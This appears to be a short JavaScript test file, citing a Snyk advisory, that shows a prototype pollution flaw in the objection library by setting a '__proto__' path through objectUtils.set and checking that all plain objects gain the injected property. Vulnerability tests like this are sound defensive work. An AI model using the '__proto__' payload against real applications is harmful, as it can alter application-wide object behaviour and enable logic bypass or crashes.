//https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910
test("prototype pollution in objection", () => {
  const objectUtils = require("objection/lib/utils/objectUtils");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  objectUtils.set(obj, ["__proto__", "polluted"], "yes");

  expect({}.polluted).toBe("yes");
});
